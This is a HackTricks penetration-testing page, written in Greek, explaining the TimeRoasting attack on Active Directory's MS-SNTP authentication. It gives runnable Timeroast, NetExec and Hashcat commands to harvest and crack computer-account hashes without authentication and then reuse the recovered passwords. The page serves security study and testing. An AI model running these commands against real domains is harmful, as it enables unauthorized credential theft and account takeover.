# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting εκμεταλλεύεται την παλαιά επέκταση αυθεντικοποίησης MS-SNTP. Στο MS-SNTP, ένας client μπορεί να στείλει ένα αίτημα 68-byte που ενσωματώνει οποιοδήποτε RID λογαριασμού υπολογιστή· ο domain controller χρησιμοποιεί το NTLM hash (MD4) του λογαριασμού υπολογιστή ως κλειδί για να υπολογίσει ένα MAC πάνω στην απάντηση και να το επιστρέψει. Οι επιτιθέμενοι μπορούν να συλλέξουν αυτά τα MS-SNTP MACs χωρίς αυθεντικοποίηση και να τα crack-άρουν offline (Hashcat mode 31300) για να ανακτήσουν τους κωδικούς των λογαριασμών υπολογιστών.

Δείτε την ενότητα 3.1.5.1 "Authentication Request Behavior" και την 4 "Protocol Examples" στην επίσημη προδιαγραφή MS-SNTP για λεπτομέρειες.
![](../../images/Pasted%20image%2020250709114508.png)
Όταν το στοιχείο ExtendedAuthenticatorSupported ADM είναι false, ο client στέλνει ένα αίτημα 68-byte και ενσωματώνει το RID στα 31 λιγότερο σημαντικά bits του Key Identifier subfield του authenticator.

> Εάν το στοιχείο ExtendedAuthenticatorSupported ADM είναι false, ο client MUST κατασκευάσει ένα Client NTP Request μήνυμα. Το μήκος του Client NTP Request μηνύματος είναι 68 bytes. Ο client ρυθμίζει το Authenticator field του Client NTP Request μηνύματος όπως περιγράφεται στην ενότητα 2.2.1, γράφοντας τα 31 λιγότερο σημαντικά bits της τιμής RID στα 31 λιγότερο σημαντικά bits του Key Identifier subfield του authenticator, και στη συνέχεια γράφοντας την τιμή Key Selector στο περισσότερο σημαντικό bit του Key Identifier subfield.

Από την ενότητα 4 (Protocol Examples):

> Μετά τη λήψη του αιτήματος, ο server επαληθεύει ότι το μέγεθος του ληφθέντος μηνύματος είναι 68 bytes. Υποθέτοντας ότι το μέγεθος του ληφθέντος μηνύματος είναι 68 bytes, ο server εξάγει το RID από το ληφθέν μήνυμα. Ο server το χρησιμοποιεί για να καλέσει τη μέθοδο NetrLogonComputeServerDigest (όπως ορίζεται στο [MS-NRPC] section 3.5.4.8.2) για να υπολογίσει τα crypto-checksums και να επιλέξει το crypto-checksum βάσει του περισσότερο σημαντικού bit του Key Identifier subfield από το ληφθέν μήνυμα, όπως ορίζεται στην ενότητα 3.2.5. Στη συνέχεια ο server στέλνει μια απάντηση στον client, θέτοντας το Key Identifier field σε 0 και το Crypto-Checksum field στο υπολογισμένο crypto-checksum.

Το crypto-checksum βασίζεται σε MD5 (βλέπε 3.2.5.1.1) και μπορεί να σπάσει εκτός σύνδεσης (offline), επιτρέποντας την roasting επίθεση.

## Πώς να επιτεθείτε

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts by Tom Tervoort
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---

## Πρακτική επίθεση (unauth) με NetExec + Hashcat

- Το NetExec μπορεί να εντοπίσει και να συλλέξει MS-SNTP MACs για RIDs υπολογιστών χωρίς αυθεντικοποίηση και να εκτυπώσει $sntp-ms$ hashes έτοιμα για cracking:
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack εκτός σύνδεσης με Hashcat mode 31300 (MS-SNTP MAC):
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Το ανακτημένο cleartext αντιστοιχεί σε ένα computer account password. Δοκιμάστε το απευθείας ως machine account χρησιμοποιώντας Kerberos (-k) όταν το NTLM είναι απενεργοποιημένο:
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Λειτουργικές συμβουλές
- Εξασφαλίστε ακριβή συγχρονισμό χρόνου πριν από το Kerberos: `sudo ntpdate <dc_fqdn>`
- Εάν χρειάζεται, δημιουργήστε το krb5.conf για το AD realm: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Χαρτογραφήστε τα RIDs σε principals αργότερα μέσω LDAP/BloodHound μόλις αποκτήσετε κάποιο authenticated foothold.

## Αναφορές

- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [NetExec – official docs](https://www.netexec.wiki/)
- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
